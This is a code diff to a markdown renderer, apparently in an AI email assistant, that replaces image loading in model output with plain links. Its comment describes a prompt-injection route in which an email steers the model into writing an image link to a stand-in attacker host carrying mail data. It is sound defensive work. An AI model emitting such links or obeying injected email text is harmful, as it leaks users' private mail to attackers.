@@ -32,6 +32,19 @@ const components: Components = {
       {...props}
     />
   ),
+  // Never load an image from model output: an email can steer the model into
+  // writing ![](https://attacker/?d=<mail data>), and the browser would fetch
+  // it at once. The address shows as a link the user may choose to open.
+  img: ({ alt, src }) => (
+    <a
+      href={typeof src === 'string' ? src : undefined}
+      target="_blank"
+      rel="noreferrer"
+      className="underline"
+    >
+      {alt || 'image'}
+    </a>
+  ),
   code: ({ node: _, ...props }) => (
     <code className="bg-muted rounded px-1 text-[0.9em]" {...props} />
   ),
